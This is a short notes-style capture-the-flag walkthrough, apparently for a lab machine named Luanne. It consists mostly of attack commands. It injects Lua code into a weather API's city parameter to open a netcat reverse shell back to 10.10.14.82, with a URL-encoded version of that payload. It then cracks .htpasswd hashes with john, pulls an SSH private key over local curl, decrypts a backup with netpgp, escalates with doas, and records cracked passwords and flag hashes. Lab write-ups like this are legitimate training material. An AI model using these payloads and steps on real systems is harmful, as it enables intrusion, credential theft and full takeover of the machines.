# Lunaane

### SCAN
 - nmap/intial

### Enum
```
http://{EXPORT_IP}/weather/forecast?city=list
```

### Reverse Shell Payload
```
[BASH PAYLOAD]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f

lua -e 'os.execute("/bin/sh")'

[Payload]
');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f")--

[Payload URL Encoding]
http://10.10.10.218/weather/forecast?city=London%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.110%204444%20%3E%2Ftmp%2Ff%22%29%27
```

### Crack the Password
```
1. Read .htpasswd
2. webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
3. john --wordlist=rockyou.txt hash
```
 - webapi_user:iamthebest

### Local Enume
```
1. netstat -ant
2. 127.0.0.1 3000 LISTEN <<
3. curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
4. SAVED_id_rsa << local
```

### USER Reverse Shell
```
1. ssh -i id_rsa r.michaels@10.10.10.218
2. ea5f0ce6a917b0be1eabc7f9218febc0
```

### Privilige Escalation
```
1. /backups/devel_backup-2020-09-16-tar.gz.enc
- which "netpgp" -> /usr/bin/netpgp

2. netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc  --output=/tmp/backups.tar.gz 

3. cat /www/.htpasswd 

4.john --wordlist=rockyou.txt hash
```
 - webapi_user2:littlebear
```
5. Net Free Bsd Sudo >  doas su

6. 7a9b5c206e8e8ba09bb99bd113675f66
```